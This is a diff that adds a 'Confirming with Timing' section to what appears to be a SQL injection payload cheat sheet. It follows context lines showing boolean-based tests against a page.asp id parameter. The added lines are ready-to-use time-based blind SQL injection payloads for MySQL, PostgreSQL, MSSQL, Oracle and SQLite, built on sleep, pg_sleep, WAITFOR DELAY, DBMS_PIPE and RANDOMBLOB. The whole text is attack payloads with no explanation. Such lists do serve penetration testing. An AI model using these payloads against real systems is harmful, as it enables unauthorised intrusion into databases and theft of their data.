@@ -30,6 +30,27 @@ page.asp?id=1" or 1=1 -- results in true
 page.asp?id=1 and 1=2 -- results in false
 ```
 
+### **Confirming with Timing**
+```
+MySQL (string concat and logical ops)
+1' + sleep(10)
+1' and sleep(10)
+1' && sleep(10)
+1' | sleep(10)
 
+PostgreSQL (only support string concat)
+1' || pg_sleep(10)
+
+MSQL
+1' WAITFOR DELAY '0:0:10'
+
+Oracle
+1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
+
+SQLite
+1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+```
 
 
